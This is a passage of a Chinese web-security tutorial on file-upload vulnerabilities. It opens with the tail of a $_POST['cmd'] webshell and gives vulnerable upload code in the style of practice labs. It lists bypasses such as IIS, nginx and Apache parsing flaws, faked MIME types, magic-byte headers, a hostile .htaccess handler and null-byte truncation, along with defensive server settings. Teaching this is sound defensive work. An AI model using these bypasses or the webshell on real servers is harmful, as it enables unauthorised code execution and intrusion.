class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>并且修改后缀名为 jpg，上传操作，通过 burpsuit 抓包改包，使其后缀名修改回 php。</p>\n<h2 id=\"服务器检测扩展名\"><a class=\"anchor\" href=\"#服务器检测扩展名\">#</a> 服务器检测扩展名</h2>\n<p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传<br />\n在检查扩展名是否合法的时候，有两种策略：</p>\n<h3 id=\"黑名单策略\"><a class=\"anchor\" href=\"#黑名单策略\">#</a> 黑名单策略</h3>\n<p>文件扩展名在黑名单中的为不合法</p>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.asp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.aspx'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.jsp'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 收尾去空</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span>            </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                 <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"白名单策略\"><a class=\"anchor\" href=\"#白名单策略\">#</a> 白名单策略</h3>\n<p>文件扩展名不在白名单中的均为不合法</p>\n<p>示例：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_path'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"原理-2\"><a class=\"anchor\" href=\"#原理-2\">#</a> 原理</h3>\n<p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p>\n<h3 id=\"绕过方法-2\"><a class=\"anchor\" href=\"#绕过方法-2\">#</a> 绕过方法</h3>\n<p>在一些 Web server 中，存在解析漏洞:</p>\n<pre><code>1. 老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析\n\n2. 老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容\n来避免黑名单过滤，如 a.asp;jpg\n\n3. 旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使\n得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行\n\n4. nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行\n（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）\n\n5. apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析\n文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，\n从而达到了注入php代码的目的\n</code></pre>\n<h2 id=\"服务器检测mime\"><a class=\"anchor\" href=\"#服务器检测mime\">#</a> 服务器检测 MIME</h2>\n<p>原理 检查 Content-Type</p>\n<p>HTTP 协议规定了上传资源的时候在 Header 中加上一项文件的 MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的，因为 HTTP header 可以被发出者或者中间人任意的修改。</p>\n<h3 id=\"常见类型\"><a class=\"anchor\" href=\"#常见类型\">#</a> 常见类型</h3>\n<table>\n    <tr>\n        <th>文件后缀</th>\n        <th>Mime类型</th>\n        <th>说明</th>\n    </tr>\n    <tr>\n        <td>.flv</td>\n        <td>flv/flv-flash</td>\n        <td>在线播放</td>\n    </tr>\n    <tr>\n        <td>.html或.htm</td>\n        <td>text/html</td>\n        <td>超文本标记语言文本</td>\n    </tr>\n    <tr>\n        <td>.rtf</td>\n        <td>application/rtf</td>\n        <td>RTF文本</td>\n    </tr>\n    <tr>\n        <td>.gif 或.png</td>\n        <td>image/gif(image/png)</td>\n        <td>GIF图形/PNG图片</td>\n    </tr>\n    <tr>\n        <td>.jpeg或.jpg</td>\n        <td>image/jpeg</td>\n        <td>JPEG图形</td>\n    </tr>\n    <tr>\n        <td>.au</td>\n        <td>audio/basic</td>\n        <td>au声音文件</td>\n    </tr>\n    <tr>\n        <td>.mid或.midi</td>\n        <td>audio/midi或audio/x-midi</td>\n        <td>MIDI音乐文件</td>\n    </tr>\n    <tr>\n        <td>.ra或.ram或.rm</td>\n        <td>audio/x-pn-realaudio</td>\n        <td>RealAudio音乐文件</td>\n    </tr>\n    <tr>\n        <td>.mpg或.mpeg或.mp3</td>\n        <td>video/mpeg</td>\n        <td>MPEG文件</td>\n    </tr>\n    <tr>\n        <td>.avi</td>\n        <td>video/x-msvideo</td>\n        <td>AVI文件</td>\n    </tr>\n    <tr>\n        <td>.gz</td>\n        <td>application/x-gzip</td>\n        <td>GZIP文件</td>\n    </tr>\n    <tr>\n        <td>.tar</td>\n        <td>application/x-tar</td>\n        <td>TAR文件</td>\n    </tr>\n    <tr>\n        <td>.exe</td>\n        <td>application/octet-stream</td>\n        <td>下载文件类型</td>\n    </tr>\n    <tr>\n        <td>.rmvb</td>\n        <td>video/vnd.rn-realvideo</td>\n        <td>在线播放</td>\n    </tr>\n    <tr>\n        <td>.txt</td>\n        <td>text/plain</td>\n        <td>普通文本</td>\n    </tr>\n    <tr>\n        <td>.mrp</td>\n        <td>application/octet-stream</td>\n        <td>MRP文件&#xff08;国内普遍的手机&#xff09;</td>\n    </tr>\n    <tr>\n        <td>.ipa</td>\n        <td>application/iphone-package-archive</td>\n        <td>IPA文件(IPHONE)</td>\n    </tr>\n    <tr>\n        <td>.deb</td>\n        <td>application/x-debian-package-archive</td>\n        <td>DED文件(IPHONE)</td>\n    </tr>\n    <tr>\n        <td>.apk</td>\n        <td>application/vnd.android.package-archive</td>\n        <td>APK文件(安卓系统)</td>\n    </tr>\n    <tr>\n        <td>.cab</td>\n        <td>application/vnd.cab-com-archive</td>\n        <td>CAB文件(Windows Mobile)</td>\n    </tr>\n    <tr>\n        <td>.xap</td>\n        <td>application/x-silverlight-app</td>\n        <td>XAP文件(Windows Phone 7)</td>\n    </tr>\n    <tr>\n        <td>.sis</td>\n        <td>application/vnd.symbian.install-archive</td>\n        <td>SIS文件(symbian平台)</td>\n    </tr>\n    <tr>\n        <td>.jar</td>\n        <td>application/java-archive</td>\n        <td>JAR文件(JAVA平台手机通用格式)</td>\n    </tr>\n    <tr>\n        <td>.jad</td>\n        <td>text/vnd.sun.j2me.app-descriptor</td>\n        <td>JAD文件(JAVA平台手机通用格式)</td>\n    </tr>\n    <tr>\n        <td>.sisx</td>\n        <td>application/vnd.symbian.epoc/x-sisx-app</td>\n        <td>SISX文件(symbian平台)</td>\n    </tr>\n</table>\n<h3 id=\"绕过方法-3\"><a class=\"anchor\" href=\"#绕过方法-3\">#</a> 绕过方法</h3>\n<p>使用各种各样的工具（如 burpsuite）强行篡改 Header 就可以，将 Content-Type: application/php 改为其他 web 程序允许的类型。</p>\n<h2 id=\"文件头检查文件\"><a class=\"anchor\" href=\"#文件头检查文件\">#</a> 文件头检查文件</h2>\n<p>原理:<br />\n 利用的是每一个特定类型的文件都会有不太一样的开头或者标志位。</p>\n<h3 id=\"常见格式\"><a class=\"anchor\" href=\"#常见格式\">#</a> 常见格式</h3>\n<table>\n    <tr>\n        <th align=\"left\">格式</th>\n        <th align=\"left\">文件头</th>\n    </tr>\n    <tr>\n        <td align=\"left\">TIFF (tif)</td>\n        <td align=\"left\">49492A00</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Windows Bitmap (bmp)</td>\n        <td align=\"left\">424D</td>\n    </tr>\n    <tr>\n        <td align=\"left\">CAD (dwg)</td>\n        <td align=\"left\">41433130</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Adobe Photoshop (psd)</td>\n        <td align=\"left\">38425053</td>\n    </tr>\n    <tr>\n        <td align=\"left\">JPEG (jpg)</td>\n        <td align=\"left\">FFD8FF</td>\n    </tr>\n    <tr>\n        <td align=\"left\">PNG (png)</td>\n        <td align=\"left\">89504E47</td>\n    </tr>\n    <tr>\n        <td align=\"left\">GIF (gif)</td>\n        <td align=\"left\">47494638</td>\n    </tr>\n    <tr>\n        <td align=\"left\">XML (xml)</td>\n        <td align=\"left\">3C3F786D6C</td>\n    </tr>\n    <tr>\n        <td align=\"left\">HTML (html)</td>\n        <td align=\"left\">68746D6C3E</td>\n    </tr>\n    <tr>\n        <td align=\"left\">MS Word/Excel (xls.or.doc)</td>\n        <td align=\"left\">D0CF11E0</td>\n    </tr>\n    <tr>\n        <td align=\"left\">MS Access (mdb)</td>\n        <td align=\"left\">5374616E64617264204A</td>\n    </tr>\n    <tr>\n        <td align=\"left\">ZIP Archive (zip)，</td>\n        <td align=\"left\">504B0304</td>\n    </tr>\n    <tr>\n        <td align=\"left\">RAR Archive (rar)，</td>\n        <td align=\"left\">52617221</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Wave (wav)，</td>\n        <td align=\"left\">57415645</td>\n    </tr>\n    <tr>\n        <td align=\"left\">AVI (avi)，</td>\n        <td align=\"left\">41564920</td>\n    </tr>\n    <tr>\n        <td align=\"left\">Adobe Acrobat (pdf)，</td>\n        <td align=\"left\">255044462D312E</td>\n    </tr>\n</table>\n<h3 id=\"绕过方法-4\"><a class=\"anchor\" href=\"#绕过方法-4\">#</a> 绕过方法</h3>\n<p>给上传脚本加上相应的幻数头字节就可以，php 引擎会将 &lt;? 之前的内容当作 html 文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br />\n（一般不限制图片文件格式的时候使用 GIF 的头比较方便，因为全都是文本可打印字符。）</p>\n<h2 id=\"限制web-server对特定类型文件的行为htaccess文件攻击\"><a class=\"anchor\" href=\"#限制web-server对特定类型文件的行为htaccess文件攻击\">#</a> 限制 Web Server 对特定类型文件的行为 (.htaccess 文件攻击)</h2>\n<h3 id=\"原理-3\"><a class=\"anchor\" href=\"#原理-3\">#</a> 原理</h3>\n<p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 ./upload/ 下面要防止数据被当作代码执行，我们可以限制 web server 对于特定文件夹的行为。</p>\n<p>大多数服务端软件都可以支持用户对于特定类型文件的行为的自定义，以 Apache 为例：</p>\n<blockquote>\n<p>在默认情况下，对与 .php 文件 Apache 会当作代码来执行，对于 html,css,js 文件，则会直接由 HTTP Response 交给客户端程序对于一些资源文件，比如 txt，doc，rar 等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此 Apache 使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对 web server 行为进行限制。<br />\n禁止脚本执行有多种方式可以实现，而且分别有不同的效果：</p>\n</blockquote>\n<p>指定特定扩展名的文件的处理方式，原理是指定 Response 的 Content-Type 可以加上如下几行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>AddType text/plain .pl .py .php</pre></td></tr></table></figure><p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p>\n<p>这种情况下，以上几种脚本文件会被当作纯文本来显示出来，你也可以换成其他的 Content-Type</p>\n<p>如果要完全禁止特定扩展名的文件被访问，用下面的几行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Options -ExecCGI</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</pre></td></tr></table></figure><p>在这种情况下，以上几种类型的文件被访问的时候，会返回 403 Forbidden 的错误</p>\n<p>强制 web 服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让 apache 将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"\\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>ForceType text/plain</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><p>只允许访问特定类型的文件。使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问 (白名单策略)。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>Files ^<span class=\"token punctuation\">(</span>*.jpeg<span class=\"token operator\">|</span>*.jpg<span class=\"token operator\">|</span>*.png<span class=\"token operator\">|</span>*.gif<span class=\"token punctuation\">)</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>order deny,allow</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>deny from all</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span>/Files<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"绕过方法-5\"><a class=\"anchor\" href=\"#绕过方法-5\">#</a> 绕过方法</h3>\n<p>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</p>\n<p>补充知识 htaccess：</p>\n<blockquote>\n<p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n</blockquote>\n<hr />\n<p>这里还有一种</p>\n<p>如果 PHP 安全没配置好就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。<br />\n来做个小实验，先描述下效果：</p>\n<blockquote>\n<p>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含 &quot;haha&quot; 这个字符串的任意文件，所以无论文件名是什么样子，只要包含 &quot;haha&quot; 这个字符串，都可以被以 php 的方式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很多上传验证机制建一个.htaccess 文件，里面的内容如下</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>FilesMatch <span class=\"token string\">\"haha\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    SetHandler application/x-httpd-php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>/FilesMatch<span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"文件系统00截断\"><a class=\"anchor\" href=\"#文件系统00截断\">#</a> 文件系统 00 截断</h2>\n<p>00 截断的条件 (过气了)</p>\n<pre><code class=\"language-txt\">1.  php版本小于5.3.4\n2.  php的magic\\_quotes\\_gpc为OFF状态\n</code></pre>\n<h3 id=\"原理-4\"><a class=\"anchor\" href=\"#原理-4\">#</a> 原理</h3>\n<p>** 在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。** 利用 00 截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生 0x00、%00 上传截断漏洞。</p>\n<h3 id=\"绕过方法-6\"><a class=\"anchor\" href=\"#绕过方法-6\">#</a> 